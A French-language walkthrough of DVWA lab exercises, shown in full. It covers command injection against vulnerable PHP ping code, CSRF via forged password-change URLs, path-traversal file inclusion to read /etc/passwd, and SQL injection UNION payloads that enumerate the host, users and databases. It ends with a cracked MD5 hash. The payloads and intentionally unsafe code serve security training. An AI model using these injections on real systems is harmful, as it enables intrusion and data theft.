# Command Execution
## Low

```php
 <?php

if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
    
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';
        
    } else { 
    
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';
        
    }
    
}
?> 
```
Le code attend une entrée stockée dans la variable `$target` puis selon l'OS détecté, lance la commande shell `ping $target`.
dans une utilisation normale un utilisateur va donc taper une adresse IP.
On peut renseigner `127.0.0.1 && <commande à lancer>` et la commande va se lancer.
par exemple: `127.0.0.1 && ls /` donne le résultat:
```bash
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.012/0.016/0.022/0.005 ms
backups
cache
lib
local
lock
log
mail
opt
run
spool
tmp
```

## Medium

```php
 <?php

if( iss
et( $_POST[ 'submit'] ) ) {

    $target = $_REQUEST[ 'ip' ];

    // Remove any of the charactars in the array (blacklist).
    $substitutions = array(
        '&&' => '',
        ';' => '',
    );

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    
    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
    
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';
        
    } else { 
    
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';
        
    }
}

?> 
```

Un test a été ajouté au code, s'il détecte `&&` ou `;` il les retire.
On peut tout de même utiliser `||`,`|` ou `&`.
Par exemple 127.0.0.1 | ls /
```bash
bin
boot
cdrom
dev
etc
home
initrd.img
lib
lost+found
media
mnt
opt
proc
rofs
root
sbin
selinux
srv
sys
tmp
usr
var
vmlinuz
```

## High
```php
<?php

if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST["ip"];
    
    $target = stripslashes( $target );
    
    
    // Split the IP into 4 octects
    $octet = explode(".", $target);
    
    // Check IF each octet is an integer
    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {
    
    // If all 4 octets are int's put the IP back together.
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
    
    
        // Determine OS and execute the ping command.
        if (stristr(php_uname('s'), 'Windows NT')) { 
    
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        
        } else { 
    
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        
        }
    
    }
    
    else {
        echo '<pre>ERROR: You have entered an invalid IP</pre>';
    }
    
    
}

?> 
```

# CSRF
## Low
Le principe est que l'action lancée par l'URL s'exécute selon les droits de l'utilisateur. Donc si je vais sur l'URL http://192.168.99.110/vulnerabilities/csrf/?password_new=ADMIN&password_conf=ADMIN&Change=Change# en tant qu'utilisateur maxime, le mot de passe de maxime sera update par ADMIN.
Le but est donc de faire lancer l'url http://192.168.99.110/vulnerabilities/csrf/?password_new=ADMIN&password_conf=ADMIN&Change=Change# par l'utilisateur qui nous interesse.

## Medium
Le paramètre HTTP_REFERER est testé pour savoir si la référence est 127.0.0.1.
Juste lancer l'URL ne suffit plus il faut modifier le HEADER et notamment le paramètre referer par 127.0.0.1.
Nous l'avons fait via l'extension de navigateur Tamper Data qui permet, à l'exécution de l'url de modifier le Header.

# File Inclusion
## Low
L'attaque de type file inclusion permet d'indiquer au serveur un fichier à afficher.
En prenant en compte le résultat de la commande pwd `| ls /opt/lampp/htdocs/vulnerabilities/fi` on peut ouvrir le fichier `etc/passwd` en indiquant `?page=../../../../../etc/passwd` on peut aussi mettre l'adresse d'une page d'un site

## Medium
Les urls commençant par `http://` ou `https://` sont automatiquement modifiées en les enlevant.
On peut tout de même ouvrir des pages du serveur ou ftp et autre

# SQL Injection
`1' or 1=1; -- `
le 1 corespond à l'id de l'user, le `'` correspond à la fin des cotes pour l'id de l'user, `or 1=1;` correspond à la fin de la requête. ` -- ` indique au moteur que tout ce qui suit est un commentaire.

Pour récupérer le nom de la machine ainsi que la version de mysql:
`127' union SELECT @@hostname, @@version`
Pour récupérer le current_user ainsi que l'user:
`127' union SELECT current_user(), user()`
avoir la liste de toutes les bases:
`127' union SELECT schema_name, schema_name from information_schema.schemata; -- `
...

5f4dcc3b5aa765d61d8327deb882cf99
password